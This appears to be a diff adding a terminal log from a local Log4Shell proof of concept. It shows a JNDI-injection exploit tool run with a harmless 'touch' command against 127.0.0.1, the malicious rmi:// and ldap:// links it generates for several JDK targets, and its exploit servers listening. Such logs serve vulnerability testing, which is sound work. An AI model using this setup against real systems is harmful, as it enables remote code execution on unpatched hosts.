@@ -1,0 +1,18 @@
+cagdas@cagdas-mint:~/Downloads$ java -jar jndi.jar -C "touch /home/cagdas/log4j" -A "127.0.0.1"
+[ADDRESS] >> 127.0.0.1
+[COMMAND] >> touch /home/cagdas/log4j
+----------------------------JNDI Links----------------------------
+Target environment(Build in JDK 1.7 whose trustURLCodebase is true):
+rmi://127.0.0.1:1099/xnfibk
+ldap://127.0.0.1:1389/xnfibk
+Target environment(Build in JDK 1.8 whose trustURLCodebase is true):
+rmi://127.0.0.1:1099/stizfv
+ldap://127.0.0.1:1389/stizfv
+Target environment(Build in JDK whose trustURLCodebase is false and have Tomcat 8+ or SpringBoot 1.2.x+ in classpath):
+rmi://127.0.0.1:1099/ngiuvv
+
+----------------------------Server Log----------------------------
+2021-12-11 15:01:06 [JETTYSERVER]>> Listening on 0.0.0.0:8180
+2021-12-11 15:01:06 [RMISERVER]  >> Listening on 0.0.0.0:1099
+2021-12-11 15:01:06 [LDAPSERVER] >> Listening on 0.0.0.0:1389
+
